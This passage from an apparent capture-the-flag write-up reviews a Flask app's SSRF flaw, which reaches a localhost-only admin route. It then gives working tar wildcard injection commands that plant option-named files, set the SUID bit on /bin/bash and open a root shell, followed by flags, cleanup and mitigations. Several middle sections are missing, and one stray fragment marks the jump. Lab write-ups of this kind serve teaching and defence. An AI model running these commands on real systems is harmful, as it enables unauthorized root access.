4. SOURCE CODE REVIEW
--------------------------------------------------------------------------
Read app.py. Key routes:

  [GET /]            -> renders the index form.
  [GET /preview]     -> SSRF: takes ?url=, validates only the HOSTNAME
                        against ALLOWED_HOSTS = {"kestrel.thm"}, then
                        requests.get(target) and prints the body back.
  [GET /admin/...]   -> reads /opt/voltlabs-preview/admin_notes.txt, but
                        only when request.remote_addr starts with "127."

Critical takeaways:
  - The allow-list checks HOSTNAME ONLY. No scheme check, no port check,
    no redirect protection.
  - "kestrel.thm" resolves to 127.0.0.1 via /etc/hosts (per README).
  - /admin/* is source-IP gated to localhost.

=> We can reach /admin/* from "localhost" by going THROUGH the SSRF:
   the preview runs on the box, so requests from it come from 127.0.0.1
   and pass the check.

  write to) and tars "*". Classic TAR WILDCARD INJECTION.

--------------------------------------------------------------------------
8. PRIVILEGE ESCALATION: TAR WILDCARD INJECTION
--------------------------------------------------------------------------
GNU tar interprets filenames beginning with "-" as command-line options.
When the cron expands "*" inside a directory we control, we can plant
files named like tar options and force tar to run a command as root.

Files to plant:
  --checkpoint=1                    (tar emits a checkpoint every record)
  --checkpoint-action=exec=sh pwn.sh (run our script at each checkpoint)
  pwn.sh                            (our root payload)

Execution:

  cd /opt/backups
  echo 'chmod +s /bin/bash' > pwn.sh
  touch -- '--checkpoint=1'
  touch -- '--checkpoint-action=exec=sh pwn.sh'

Wait <= 60s for the cron tick, then verify the SUID bit:

  ls -l /bin/bash
  -rwsr-sr-x 1 root root ... /bin/bash     <-- owned by root + SUID

Drop to a root shell (privileged mode so bash keeps euid=0):

  bash -p
  bash-5.2# id
  uid=0(root) gid=0(root)

9. FLAGS & CLEANUP
--------------------------------------------------------------------------
Root flag:

  bash-5.2# cat /root/flag.txt
  THM{e6ee84a483d67ade06936fcfd1433e8a}

Flags summary:
  user.txt  THM{96dc7bd50d2fb98fcece01560788b5ab}
  root/flag THM{e6ee84a483d67ade06936fcfd1433e8a}

Cleanup (so the cron stops re-triggering and bash is restored):

  rm -- /opt/backups/'--checkpoint=1' \
        /opt/backups/'--checkpoint-action=exec=sh pwn.sh' \
        /opt/backups/pwn.sh
  chmod -s /bin/bash

--------------------------------------------------------------------------
MITIGATIONS (if this were a real engagement)
--------------------------------------------------------------------------
  - Disable anonymous FTP or restrict it to a read-only drop zone.
  - Never keep internal admin credentials in files readable by services.
  - SSRF: validate scheme + resolved IP, block RFC1918/loopback,
    reject redirects, and scope to a non-loopback internal host.
  - Cron/backup jobs: use explicit file lists or dedicated account,
    never "cd <user-writable-dir> && tar *".
